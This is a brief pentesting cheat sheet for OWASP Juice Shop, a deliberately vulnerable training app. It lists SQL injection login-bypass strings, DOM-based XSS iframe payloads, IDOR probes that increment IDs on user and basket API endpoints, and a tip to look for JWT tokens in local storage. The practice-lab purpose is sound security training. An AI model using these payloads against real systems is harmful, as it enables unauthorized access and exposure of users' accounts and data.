# Reusable Pentesting Payloads - OWASP Juice Shop

## Authentication Bypass (SQLi)
- `' OR 1=1 --`
- `' OR '1'='1`
- `admin' --`

## XSS (DOM-based)
- `<iframe src="javascript:alert(`xss`)">`
- `<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>`

## IDOR Probing
- GET /api/Users/:id (Increment :id)
- GET /api/Baskets/:id (Increment :id)

## Methodology Notes
- Always check for JWT tokens in local storage.
- Use browser console to inspect API responses.
- Document all successful payloads in this file.